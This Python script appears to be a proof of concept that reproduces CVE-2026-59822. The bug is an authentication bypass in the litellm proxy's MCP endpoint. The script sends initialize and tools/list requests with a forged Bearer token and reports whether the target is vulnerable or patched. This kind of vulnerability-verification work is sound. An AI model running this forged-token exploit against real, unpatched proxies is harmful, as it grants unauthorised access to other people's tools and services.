#!/usr/bin/env python3
"""CVE-2026-59822 PoC - MCP Streamable HTTP auth bypass via OAuth2 fallback.

Standardized reproduction (framework step EXPLOIT):
  ENV    : litellm proxy + postgres + one allow_all_keys MCP server + fake
           MCP upstream :9999 logging every request.
  RECON  : baseline no-auth probe.
  EXPLOIT: JSON-RPC initialize + tools/list against POST /mcp with a forged
           Authorization: Bearer that is NOT a litellm key.
  VERDICT (version-independent oracle):
    VULNERABLE (<1.84.0): forged bearer reaches MCP tooling -> 200 + session
      id, tools/list succeeds, fake upstream REQUEST_LOG gains an entry.
    PATCHED   (>=1.84.0): same request -> HTTP 401 + WWW-Authenticate,
      upstream log gains NO new entry.

Usage:  poc_cve_2026_59822.py http://127.0.0.1:4101
Exit:   0=VULNERABLE, 1=PATCHED, 2=INCONCLUSIVE
"""
import json, os, sys, time, urllib.request, urllib.error

HERE = os.path.dirname(os.path.abspath(__file__))
EV = os.path.join(HERE, "..", "evidence")
BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:4101").rstrip("/")
PORT_TAG = BASE.rsplit(":", 1)[-1]
FORGED = "Bearer sk-forged-" + os.urandom(8).hex()

def req(path, payload=None, headers=None):
    url = BASE + path
    hdrs = {"Content-Type": "application/json",
            "Accept": "application/json, text/event-stream"}
    if headers: hdrs.update(headers)
    body = json.dumps(payload).encode() if payload is not None else None
    r = urllib.request.Request(url, data=body, headers=hdrs, method="POST")
    try:
        with urllib.request.urlopen(r, timeout=20) as resp:
            return resp.status, dict(resp.headers), resp.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read().decode()
    except Exception as e:
        return None, {}, "ERR %s" % e

def upstream_entries():
    p = os.path.join(HERE, "REQUEST_LOG.json")
    if not os.path.exists(p): return []
    try: return json.load(open(p))
    except Exception: return []

def main():
    out = {"target": BASE, "forged_bearer_prefix": FORGED[:24]+"...", "steps": []}
    st, hd, bd = req("/mcp", {"jsonrpc":"2.0","id":1,"method":"initialize",
        "params":{"protocolVersion":"2025-03-26","capabilities":{},
                  "clientInfo":{"name":"recon","version":"0"}}})
    out["steps"].append({"step":"RECON_no_auth","status":st,
                         "www_authenticate":hd.get("WWW-Authenticate"),
                         "body_head":bd[:300]})
    before = len(upstream_entries())
    st1, hd1, bd1 = req("/mcp", {"jsonrpc":"2.0","id":1,"method":"initialize",
        "params":{"protocolVersion":"2025-03-26","capabilities":{},
                  "clientInfo":{"name":"attacker","version":"1"}}},
        headers={"Authorization": FORGED})
    out["steps"].append({"step":"EXPLOIT_initialize","status":st1,
                         "session":hd1.get("mcp-session-id"),
                         "www_authenticate":hd1.get("WWW-Authenticate"),
                         "body_head":bd1[:500]})
    sid = hd1.get("mcp-session-id"); tools = None
    if st1 == 200 and sid:
        req("/mcp", {"jsonrpc":"2.0","method":"notifications/initialized"},
            headers={"Authorization": FORGED, "mcp-session-id": sid})
        st2, hd2, bd2 = req("/mcp", {"jsonrpc":"2.0","id":2,
            "method":"tools/list","params":{}},
            headers={"Authorization": FORGED, "mcp-session-id": sid})
        out["steps"].append({"step":"EXPLOIT_tools_list","status":st2,
                             "body_head":bd2[:800]})
        txt = bd2
        for line in txt.splitlines():
            if line.startswith("data:"): txt = line[5:].strip()
            if txt.startswith("{"): break
        try: tools = json.loads(txt).get("result", {}).get("tools")
        except Exception: tools = None
    time.sleep(1.5)
    out["upstream_log_delta"] = len(upstream_entries()) - before
    out["tools"] = [t.get("name") for t in tools] if tools else None
    if st1 == 200 and (tools or out["upstream_log_delta"] > 0):
        verdict, why, exitc = "VULNERABLE", (
            "forged Authorization: Bearer reached MCP tooling; upstream MCP "
            "server observed %d request(s) from the proxy" % out["upstream_log_delta"]), 0
    elif st1 == 401:
        verdict, why, exitc = "PATCHED", "forged bearer rejected 401 with WWW-Authenticate challenge", 1
    else:
        verdict, why, exitc = "INCONCLUSIVE", "unexpected status %s" % st1, 2
    out["verdict"] = verdict; out["why"] = why
    os.makedirs(EV, exist_ok=True)
    dst = os.path.join(EV, "poc_%s_result.json" % PORT_TAG)
    json.dump(out, open(dst, "w"), indent=2, ensure_ascii=False)
    print(json.dumps({"verdict": verdict, "why": why, "status_init": st1,
                      "upstream_delta": out["upstream_log_delta"],
                      "result_file": dst}, ensure_ascii=False, indent=2))
    sys.exit(exitc)

if __name__ == "__main__":
    main()
